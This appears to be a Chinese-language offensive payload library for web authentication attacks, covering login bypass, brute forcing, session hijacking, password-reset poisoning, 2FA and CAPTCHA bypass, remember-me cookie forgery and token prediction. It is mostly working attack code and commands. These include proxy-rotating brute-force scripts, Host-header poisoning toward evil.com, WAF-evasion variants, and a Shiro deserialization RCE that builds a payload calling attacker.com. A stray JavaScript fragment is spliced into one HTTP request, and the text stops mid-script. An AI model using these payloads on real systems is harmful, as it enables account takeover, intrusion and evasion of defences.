# 通用认证 / 会话 / 密码重置 / 2FA payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:认证绕过 / 暴力破解 / 会话劫持 / 密码重置 / 2FA 绕过 / 验证码绕过 / "记住我" cookie 漏洞。

---

## A. 认证绕过 / 暴力破解 / 会话 / 密码重置

### 认证绕过  `auth-bypass`
Web应用认证绕过技术
子类：**认证绕过** · tags: `auth` `bypass` `authentication`

**前置条件：** 目标存在认证机制；认证实现存在缺陷

**攻击链：**

**1. SQL注入绕过**
_SQL注入绕过登录_
```
admin'--
admin' OR '1'='1
```

**2. 数组绕过**
_PHP数组绕过_
```
user[]=admin&pass[]=admin
```

**3. 类型转换**
_类型转换绕过_
```
# PHP类型转换绕过 - 数组与类型混淆:
# 1. 数组绕过密码比较(strcmp绕过):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) 在PHP中返回NULL，NULL == 0 为true

# 2. 松散比较绕过:
POST /login HTTP/1.1
Content-Type: application/json,

        syntaxBreakdown: [
          { part: ''', explanation: { zh: '闭合引号', en: 'Close quote' }, type: 'char' },
          { part: 'OR', explanation: { zh: '逻辑或', en: 'Logical OR' }, type: 'keyword' },
          { part: '--', explanation: { zh: 'SQL注释', en: 'SQL comment' }, type: 'operator' }
        ]
{"user":"admin","pass":true}
# true == "any_string" 在PHP松散比较中为true

# 3. 数字型字符串绕过:
{"user":"admin","pass":0}
# 0 == "password_string" 在PHP中为true(PHP < 8.0)
```

**4. JSON绕过**
_NoSQL绕过_
```
{"user":"admin","pass":{"$ne":""}}
```

**5. IP伪造**
_IP伪造绕过_
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
```

**6. HTTP方法**
_HTTP方法绕过_
```
# HTTP方法篡改绕过认证:
# 1. 尝试不同HTTP方法:
curl -X POST "http://target.com/admin" -v
curl -X PUT "http://target.com/admin" -v
curl -X PATCH "http://target.com/admin" -v
curl -X DELETE "http://target.com/admin" -v
curl -X OPTIONS "http://target.com/admin" -v

# 2. 方法覆盖头:
curl -X POST -H "X-HTTP-Method-Override: PUT" "http://target.com/admin"
curl -X POST -H "X-Method-Override: DELETE" "http://target.com/admin"

# 3. URL路径穿越绕过:
curl "http://target.com/admin/..;/admin"
curl "http://target.com/;/admin"
curl "http://target.com/%2e%2e/admin"
```

**WAF/EDR 绕过变体：**

**1. HTTP方法篡改与路径规范化**
_使用非标准HTTP方法或方法覆盖头绕过基于方法的访问控制，利用URL路径大小写、双斜杠、点号、编码等规范化差异绕过路径匹配_
```
# HTTP方法篡改:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE

# 路径规范化:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200
```

**2. HTTP/2伪头与请求拆分**
_利用HTTP/2伪头部(:path等)或X-Original-URL/X-Rewrite-URL头覆盖请求路径绕过反向代理ACL，通过IP伪造头绕过基于来源的认证_
```
# HTTP/2伪头绕过:
:method: GET
:path: /admin
:authority: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Header注入:
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
```

---

### 暴力破解  `auth-brute`
自动化密码猜测攻击
子类：**暴力破解** · tags: `auth` `brute-force` `password`

**前置条件：** 无验证码；无锁定策略

**攻击链：**

**1. Pitchfork**
_多字段同时爆破_
```
Burp Intruder: Pitchfork模式
```

**2. Cluster bomb**
_笛卡尔积爆破_
```
Burp Intruder: Cluster bomb模式
```

**3. 基于响应差异的用户名枚举**  _[linux]_
_通过响应状态码/长度/时间的差异来区分有效和无效用户名_
```
# 通过响应长度/时间差异枚举有效用户名
# 对比有效 vs 无效用户名的响应:
curl -s -o /dev/null -w "user=admin: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=admin&password=wrong" "http://target.com/login"

curl -s -o /dev/null -w "user=xxxxx: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=nonexistent_user_xxxxx&password=wrong" "http://target.com/login"

# 批量枚举(注意响应差异):
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  resp=$(curl -s -o /tmp/resp.txt -w "%{http_code}:%{size_download}:%{time_total}"     -d "username=${user}&password=test" "http://target.com/login")
  echo "${user}: ${resp}"
  sleep 1
done
```

**4. 验证码/OTP爆破与绕过**
_针对OTP验证码的爆破和各种逻辑绕过手法_
```
# 场景1: 4-6位数字验证码爆破
# 检测验证码是否有速率限制:
for i in $(seq 1 10); do
  code=$(printf "%06d" $RANDOM | cut -c1-6)
  resp=$(curl -s -o /dev/null -w "%{http_code}"     -d "otp=${code}" "http://target.com/verify-otp")
  echo "Attempt ${i}: otp=${code} → HTTP ${resp}"
done

# 场景2: 通过修改响应绕过前端验证码校验
# 抓包修改响应 {"success":false} → {"success":true}

# 场景3: 验证码复用(同一验证码多次有效)
# 获取验证码后，用同一验证码尝试不同账户

# 场景4: 验证码泄露在响应中
curl -v -d "phone=13800138000&action=send_code" "http://target.com/api/sms"
# 检查响应头/响应体是否包含验证码
```

**5. 分布式暴力破解与IP轮换**
_使用代理池轮换IP避免被封禁，进行分布式暴力破解_
```
# 使用代理池进行分布式爆破:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")
```

**WAF/EDR 绕过变体：**

**1. 速率限制绕过(HTTP头伪造)**
_通过伪造X-Forwarded-For等HTTP头绕过基于IP的速率限制_
```
# 通过伪造IP头绕过基于IP的速率限制:
import requests
import random

TARGET = "http://target.com/login"
headers_rotation = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Remote-IP",
    "CF-Connecting-IP", "True-Client-IP", "Forwarded"
]

def brute_with_header_bypass(username, password):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for header in headers_rotation:
        h[header] = fake_ip
    r = requests.post(TARGET, data={"username": username, "password": password}, headers=h, timeout=10)
    return r

# 每次请求使用不同伪造IP
passwords = ["admin", "123456", "password", "admin123", "root"]
for pwd in passwords:
    r = brute_with_header_bypass("admin", pwd)
    print(f"admin:{pwd} → {r.status_code} ({len(r.text)})")
```

**2. 参数污染与大小写绕过**
_通过参数污染、格式切换、编码混淆绕过WAF对暴力破解的检测_
```
# 参数污染绕过:
# 正常请求(被限制):
curl -d "username=admin&password=test" "http://target.com/login"

# 参数重复(某些后端取最后一个值):
curl -d "username=admin&username=admin&password=test" "http://target.com/login"

# JSON格式切换(如果支持):
curl -H "Content-Type: application/json"   -d '{"username":"admin","password":"test"}' "http://target.com/login"

# 大小写混淆:
curl -d "Username=admin&Password=test" "http://target.com/login"
curl -d "USERNAME=admin&PASSWORD=test" "http://target.com/login"

# Unicode混淆:
curl -d "username=admin&password=test" "http://target.com/login"

# 额外参数注入:
curl -d "username=admin&password=test&captcha=&token=" "http://target.com/login"

# 不同编码:
curl -d "username=admin&password=test" "http://target.com/login" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM037"
```

---

### 会话劫持  `auth-session`
利用会话管理缺陷劫持或伪造用户会话，获取未授权访问权限
子类：**会话管理** · tags: `auth` `session` `hijack`

**前置条件：** 目标使用基于Cookie或Token的会话管理；可以截获或预测会话标识符；网络通信未完全加密(HTTP)或存在XSS

**攻击链：**

**1. 会话Cookie属性分析**  _[linux]_
_分析目标会话Cookie的安全属性配置_
```
# 检测Cookie安全属性
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie"

# 检查关键属性:
# - HttpOnly: 防止JS读取Cookie
# - Secure: 仅通过HTTPS传输
# - SameSite: 防止CSRF
# - Path/Domain: Cookie作用域
# - Expires/Max-Age: 会话生命周期

# 批量分析Cookie:
curl -c - "http://target.com/login" -d "user=test&pass=test" 2>/dev/null | tail -5
```

**2. 会话固定攻击(Session Fixation)**  _[linux]_
_通过预设sessionId使受害者登录后攻击者可以复用该会话_
```
# 1. 攻击者获取一个有效的sessionId
curl -c cookies.txt "http://target.com/"
cat cookies.txt | grep -i "session|jsession|phpsess"

# 2. 构造包含固定sessionId的链接诱使受害者登录
# http://target.com/login;jsessionid=ATTACKER_SESSION_ID
# 或通过Set-Cookie注入:
# http://target.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=FIXED_SESSION

# 3. 受害者使用该sessionId登录后，攻击者直接使用同一sessionId
curl -b "PHPSESSID=FIXED_SESSION" "http://target.com/dashboard"
```

**3. 会话劫持(HTTP嗅探)**  _[linux]_
_在未加密的HTTP通信中截获会话Cookie_
```
# 在同一网络中嗅探HTTP Cookie (需要中间人位置)
# 使用Wireshark过滤:
http.cookie contains "session" or http.cookie contains "PHPSESSID"

# 或使用tcpdump:
tcpdump -i eth0 -A -s 0 'port 80 and (tcp[((tcp[12:1]&0xf0)>>2):4] = 0x436F6F6B)'

# 获取Cookie后直接使用:
curl -b "PHPSESSID=STOLEN_SESSION_ID" "http://target.com/admin/dashboard"
```

**4. 会话预测(弱随机性)**  _[linux]_
_通过收集多个sessionId分析其生成规律，预测有效的会话标识符_
```
# 批量收集sessionId分析规律
for i in $(seq 1 20); do
  sid=$(curl -sI "http://target.com/" | grep -i "set-cookie" | grep -oP "(?<=PHPSESSID=)[^;]+")
  echo "$i: $sid"
  sleep 0.5
done

# 使用Burp Suite Sequencer分析随机性
# 或Python分析:
# python3 -c "
# import hashlib, time
# # 如果sessionId基于时间戳:
# for t in range(int(time.time())-100, int(time.time())+100):
#     predicted = hashlib.md5(str(t).encode()).hexdigest()
#     print(predicted)
# "
```

**WAF/EDR 绕过变体：**

**1. Cookie Jar溢出与Cookie Tossing**
_通过大量设置Cookie超出浏览器存储上限挤出合法session Cookie，或利用子域名权限向父域注入恶意Cookie实现会话覆盖_
```
# Cookie Jar溢出:
# 设置大量Cookie(超过浏览器上限~50个)使旧Cookie被挤出:
for(let i=0;i<700;i++){document.cookie=`c${i}=x;domain=.target.com`}
# 原有session Cookie被挤出后可注入攻击者的session

# Cookie Tossing(子域注入):
# 从subdomain.target.com设置Cookie:
document.cookie="session=ATTACKER_SID;domain=.target.com;path=/"
# 该Cookie在主域target.com上也生效
```

**2. SameSite绕过与跨站会话泄露**
_利用SameSite=Lax允许顶级导航GET请求携带Cookie的特性通过链接点击或window.open发起带凭据的跨站请求_
```
# SameSite=Lax绕过(顶级导航GET请求携带Cookie):
<a href="http://target.com/api/transfer?to=attacker&amount=1000">click</a>
# Lax模式下GET请求会携带Cookie

# SameSite=None利用(需Secure):
# 如果设置了SameSite=None但缺少Secure属性:
# Chrome会拒绝，但旧浏览器可能接受

# 通过window.open绕过:
window.open("http://target.com/api/userinfo")
# 新窗口属于顶级导航，Lax模式下携带Cookie
```

---

### 密码重置漏洞  `auth-password-reset`
绕过密码重置流程
子类：**逻辑漏洞** · tags: `auth` `password-reset` `logic`

**前置条件：** 密码重置功能存在逻辑缺陷

**攻击链：**

**1. Host头投毒**
_重置链接指向攻击者域名_
```
# Host头投毒劫持密码重置链接:
# 1. 基础Host头投毒:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# 重置链接将变为: http://evil.com/reset?token=xxx

# 2. X-Forwarded-Host投毒:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# 3. 双Host头:
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com

email=victim@target.com

# 4. 通过Burp Collaborator验证:
Host: BURP-COLLABORATOR-ID.burpcollaborator.net
```

**2. Token爆破**
_验证码过短_
```
# 密码重置验证码爆破:
# 1. 发送重置验证码请求:
curl -d "email=victim@target.com" "http://target.com/forgot-password"

# 2. 四位数字验证码爆破(0000-9999):
# Burp Intruder设置:
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&code=§0000§
# Payload: Numbers, From 0, To 9999, Min/Max 4 digits

# 3. 六位验证码爆破(需更多时间):
import requests
for code in range(0, 999999):
    r = requests.post('http://target.com/reset-password',
        data={'email':'victim@target.com','code':f'{code:06d}'})
    if 'success' in r.text or r.status_code == 302:
        print(f'Valid code: {code:06d}')
        break
```

**3. 密码重置Token可预测性分析**
_分析密码重置Token的生成规律，判断是否可预测_
```
# 批量请求密码重置Token分析规律:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # 从邮件API或响应中获取token
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# 分析Token模式:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# 检查是否基于时间戳:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")
```

**4. 密码重置流程逻辑缺陷**
_测试密码重置流程中的各种逻辑漏洞_
```
# 1. 参数篡改 - 修改邮箱/手机号:
# 发送重置请求时替换接收邮箱
curl -d "email=victim@target.com&notify_email=attacker@evil.com"   "http://target.com/api/password-reset"

# 2. IDOR - 直接使用他人的重置Token/UID:
curl -d "token=VALID_TOKEN&uid=OTHER_USER_ID&new_password=hacked123"   "http://target.com/api/password-reset/confirm"

# 3. 步骤跳过 - 直接访问设置新密码页面:
curl -d "uid=123&new_password=test12345"   "http://target.com/api/password-reset/set-password"

# 4. Token不失效 - 使用已用过的Token:
curl -d "token=ALREADY_USED_TOKEN&new_password=newpass123"   "http://target.com/api/password-reset/confirm"

# 5. 密码重置投毒(Host头注入):
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"   -d "email=victim@target.com" "http://target.com/api/password-reset"
# 受害者收到的重置链接: http://evil.com/reset?token=xxx
```

**WAF/EDR 绕过变体：**

**1. Host头投毒多种变体绕过**
_Host头投毒的多种WAF绕过变体_
```
# 标准Host头投毒:
curl -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# X-Forwarded-Host(常被Web框架信任):
curl -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 多Host头:
curl -H "Host: target.com" -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Host中注入端口:
curl -H "Host: target.com@evil.com" -d "email=victim@target.com" "http://target.com/forgot"
curl -H "Host: target.com:evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 绝对URL覆盖Host:
curl "http://target.com/forgot" -H "Host: evil.com" --request-target "http://target.com/forgot"

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /forgot" -H "Host: evil.com" "http://target.com/forgot"
```

**2. Token爆破速率限制绕过**
_通过IP头轮换和UA随机化绕过重置Token爆破的速率限制_
```
# IP轮换绕过速率限制:
import requests
import random

def try_token(token, proxy=None):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    }
    r = requests.post("http://target.com/reset-password",
        data={"token": token, "new_password": "Test123!"},
        headers=headers, timeout=10)
    return r.status_code != 400

# 如果Token是6位数字:
for i in range(0, 1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"[+] Valid token: {token}")
        break
```

---


---

## B. 2FA / 验证码 / "记住我"

### 2FA绕过  `auth-2fa`
绕过双因素认证
子类：**2FA** · tags: `auth` `2fa` `mfa`

**前置条件：** 开启2FA

**攻击链：**

**1. 直接访问**
_强制浏览绕过2FA页面_
```
# 2FA绕过 - 强制浏览(直接跳过验证步骤):
# 1. 正常登录输入用户名密码，到达2FA验证页面
# 2. 不输入验证码，直接访问后台页面:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. 修改前端JS跳过验证:
# 在浏览器Console中执行:
# window.location = '/dashboard'

# 4. 修改响应中的验证状态:
# Burp拦截响应: {"2fa_required":true} → {"2fa_required":false}

# 5. 直接调用API(可能不检查2FA状态):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v
```

**2. 验证码爆破**
_无速率限制_
```
# 2FA验证码爆破:
# 1. TOTP通常为6位数字(000000-999999):
# 但有30秒时间窗口，需要极快速爆破

# 2. 短信验证码爆破(4位):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. 检测速率限制:
# 快速发送10次请求，观察是否被限制
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. 绕过速率限制:
# X-Forwarded-For IP轮换
# 修改User-Agent
# 添加空字节: otp=1234%00
```

**3. 逻辑绕过**
_修改响应包_
```
response=true / success=1
```

**WAF/EDR 绕过变体：**

**1. 响应篡改与直接端点访问**
_通过拦截并修改2FA验证响应包欺骗前端认为验证通过，或绕过2FA页面直接访问受保护端点测试服务端是否强制校验2FA状态_
```
# 响应篡改(Burp拦截):
# 原始响应: {"success":false,"message":"Invalid OTP"}
# 修改为:   {"success":true,"message":"Valid OTP"}

# 直接跳过2FA步骤:
# 登录后不访问/verify-2fa，直接访问:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# 修改状态参数:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true
```

**2. 备份码爆破与验证竞态条件**
_对2FA备份恢复码进行字典爆破(通常限制不如OTP严格)，利用竞态条件并发发送多个OTP验证请求绕过速率限制_
```
# 备份码爆破(通常为8位数字/字母):
# 使用Burp Intruder对backup_code参数进行爆破
POST /verify-backup-code
{"backup_code":"§12345678§"}
# 检查速率限制和锁定策略

# 竞态条件(Race Condition):
# 同时发送多个验证请求:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
done
wait
# 多线程并发可能绕过速率限制
```

---

### 验证码绕过  `auth-captcha`
绕过图形验证码
子类：**验证码** · tags: `auth` `captcha` `bypass`

**前置条件：** 存在验证码

**攻击链：**

**1. 重复使用**
_验证码未一次性失效_
```
# 验证码重放攻击(一次验证,多次使用):
# 1. 正常获取并输入正确验证码
# 2. 在Burp中抓取成功的请求
# 3. 将请求发送到Repeater，重复发送:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. 如果每次响应都正常(非"验证码错误")
#    说明验证码未一次性失效，可用于暴力破解

# 5. 配合Intruder进行密码爆破:
# Positions: password字段
# Payloads: 密码字典
# 固定captcha字段为已知有效值

# Burp Intruder设置: Sniper模式，Payload为密码列表
```

**2. 空值绕过**
_验证码参数留空_
```
# 验证码空值/参数删除绕过:
# 1. 提交空验证码:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. 提交null值:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. 完全删除captcha参数:
POST /login HTTP/1.1

username=admin&password=test

# 4. 提交特殊值:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. 不同编码:
captcha=%00
captcha=%20

# 如果任一方式登录成功，说明验证码验证可被绕过
```

**3. 删除参数**
_后端未检查参数存在性_
```
# 验证码参数移除绕过:
# 1. 原始请求(带验证码):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. 在Burp Repeater中删除captcha参数:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. 修改Content-Type测试(可能走不同处理逻辑):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. 通过移动端API(可能无验证码):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. 旧版本API(可能无验证码):
POST /api/v1/login HTTP/1.1
```

**WAF/EDR 绕过变体：**

**1. 会话复用与参数移除绕过**
_测试验证码是否在使用后立即失效(可重复使用)，删除captcha参数检查后端是否强制校验，或传入空值、数组等异常类型绕过类型检查_
```
# 会话复用(验证码未一次性失效):
# 1. 正确输入验证码一次
# 2. 后续请求继续使用相同captcha值
# Burp Repeater重放同一captcha参数

# 删除captcha参数:
# 原始: user=admin&pass=123&captcha=ABCD
# 修改: user=admin&pass=123
# 后端可能不校验缺失的参数

# 空值绕过:
captcha=
captcha=null
captcha=undefined
captcha[]=
```

**2. OCR识别与音频验证码利用**
_使用OCR工具(Tesseract)自动识别简单图形验证码，利用音频验证码的语音识别替代方案，或检查响应中是否直接泄露验证码值_
```
# OCR自动识别图形验证码:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# 音频验证码利用:
# 使用Google Speech-to-Text API识别音频验证码
# 或使用Selenium自动获取+语音识别

# 验证码响应泄露:
# 检查响应头、Cookie、隐藏字段中是否包含验证码值
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"
```

---

### 记住我漏洞  `auth-remember-me`
Remember Me功能漏洞
子类：**会话管理** · tags: `auth` `remember-me` `cookie`

**前置条件：** 开启Remember Me

**攻击链：**

**1. Cookie伪造**
_明文存储用户名_
```
# Remember-Me Cookie伪造:
# 1. 分析Cookie结构:
# 常见格式: username|timestamp|hash 或 base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64解码分析:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# 输出: user:1699000000:abcd1234

# 3. 伪造admin的Cookie:
echo -n "admin:1999999999:abcd1234" | base64
# 用生成的值替换Cookie

# 4. 如果使用弱Hash(如MD5(username+secret)):
# 注册新账号 → 分析Cookie → 推导secret → 伪造admin Cookie

# 5. 测试:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v
```

**2. Base64解码**
_弱加密或编码_
```
# Remember-Me Cookie解码与分析:
# 1. 提取Cookie值:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64解码:
echo "COOKIE_VALUE" | base64 -d

# 3. 如果是URL编码+Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. 尝试Hex解码:
echo "COOKIE_VALUE" | xxd -r -p

# 5. 分析解码后的结构:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# 序列化对象(Java/PHP)

# 6. 检查是否为已知框架的Cookie格式:
# Shiro: AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature
```

**3. 记住密码Token逆向分析**  _[linux]_
_逆向分析remember-me Token的生成逻辑_
```
# 1. 收集多个remember-me Token:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1"     "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64解码分析:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20

# 3. 检查常见格式:
# username:timestamp:hash
# username:md5(password)
# serialized_object(Java: rO0AB... PHP: O:4:...)

# 4. 如果是Java序列化(Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3
# 如果以 aced0005 开头 → Java序列化对象
# 如果Token加密: 尝试Shiro默认密钥 kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP反序列化检查:
echo "REMEMBER_TOKEN" | base64 -d
# 如果形如 O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP序列化
```

**4. Shiro RememberMe反序列化RCE**
_利用Shiro默认密钥 + 反序列化链实现RCE_
```
# Apache Shiro框架的RememberMe Cookie反序列化漏洞
# 原理: AES-CBC加密(默认密钥) → Base64编码 → Cookie

# 1. 检测Shiro框架:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# 发送无效Cookie触发特征响应:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. 已知Shiro密钥列表测试:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. 使用ShiroExploit工具:
# java -jar ShiroExploit.jar http://target.com

# 4. 手动构造payload(需要ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES加密:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"
```

**WAF/EDR 绕过变体：**

**1. Remember-Me Cookie绕过检测**
_枚举Shiro密钥和不同加密模式绕过检测_
```
# 1. 修改Cookie名称大小写:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro密钥枚举(使用不同密钥加密payload):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM模式(Shiro 1.4.2+):
# 新版Shiro使用AES-GCM，需要对应的加密方式
```

---


---

## C. 不安全随机数与 Token 预测

### Token 可预测性分析  `auth-weak-random`
分析会话Token/重置Token/验证码的生成随机性，预测合法Token实现账户接管。
子类：**认证绕过** · tags: `随机数` `Token预测` `UUID` `PRNG`

**前置条件：** 收集≥20条Token样本分析规律

**攻击链：**

**1. UUID v1（基于时间—可预测）**
_UUID v1结构：timestamp-clock_seq-node(MAC)_
```
# UUID v1 格式: 时间戳 + 时钟序列 + MAC地址
# MAC 可能从其他端点泄露
# 时间戳: 1582-10-15 起的 100ns 间隔
# 工具: guidtool 从已知时间窗口重建可能的 UUID

# 检测: UUID 第3组首字符为 '1' (版本1)
# 例: 9f218a38-12cd-11ec-8e1f-0242ac110002
#                                ^ 第3组以1开头 = UUID v1

# 如果知道服务器近似时间和MAC地址 → 可预测UUID范围
```

**2. MongoDB ObjectId**
_ObjectId结构暴露创建时间和序列号_
```
# ObjectId = 4字节时间戳 + 5字节随机 + 3字节计数器
# 例: 507f1f77bcf86cd799439011
#      ^^^^^^^^ = Unix时间戳 (前4字节hex)
echo "507f1f77" | python3 -c "print(int(input(),16))"
# 输出: 1349898103 → 创建时间泄露

# 计数器是顺序的 → 知道一个ObjectId可推测相邻值
```

**3. PHP uniqid()**
_uniqid() = hex(microsecond time)，完全可预测_
```python
# PHP uniqid() 基于当前微秒时间戳
# 输出: 5f3e7a4c1d2b3
# 如果知道服务器近似时间 → 准确预测
import time
import hashlib

approx_time = time.time()
for offset in range(-5, 6):
    ts = approx_time + offset
    candidate = format(int(ts * 1_000_000), 'x')  # microsecond hex
